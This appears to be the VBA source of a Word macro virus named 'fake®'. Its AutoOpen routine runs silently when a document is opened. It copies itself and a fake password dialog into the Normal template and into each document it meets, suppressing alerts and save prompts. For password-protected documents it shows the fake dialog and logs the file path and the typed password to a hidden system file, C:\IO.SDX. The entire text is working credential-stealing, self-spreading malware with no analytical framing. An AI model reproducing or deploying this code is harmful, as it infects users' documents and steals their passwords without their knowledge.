   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "fake®"
   Sub AutoOpen()
   ' Macro criada por Daniel !!!
   On Error GoTo Final

      Application.ScreenUpdating = False
      Application.DisplayAlerts = wdAlertsNone

      WordBasic.DisableAutoMacros 0
      Options.VirusProtection = True


      Set ActiveDoc = ActiveDocument
      Set GlobalDoc = NormalTemplate

      DocumentInstalled = False
      GlobalInstalled = False

     For I = 1 To ActiveDocument.VBProject.VBComponents.Count
         If ActiveDocument.VBProject.VBComponents(I).Name = "fake®" Then
            DocumentInstalled = True
         End If
      Next

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
         If NormalTemplate.VBProject.VBComponents(J).Name = "fake®" Then
           GlobalInstalled = True
         End If
      Next

         If DocumentInstalled = False Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="fake®", Object:=wdOrganizerObjectProjectItems
             ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
               Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
                 ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
         End If


         If GlobalInstalled = False Then
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="fake®", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
               Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
               Options.SaveNormalPrompt = False
         End If
           If ActiveDocument.HasPassword = False Then GoTo Final
        PassBox.Show
        Call Abre
   Final:
       End Sub

   Function Abre()

   On Error Resume Next
   SetAttr "C:\IO.SDX", 0
   Open "C:\IO.SDX" For Append As #1
   Print #1, "Path = " + ActiveDocument.FullName
   Print #1, "Password = " + PassBox.TextBox1
   Print #1, " "
   Close #1
   SetAttr "C:\IO.SDX", 1 + 2 + 4

   Application.DisplayAlerts = wdAlertsAll
   Unload PassBox

   End Function
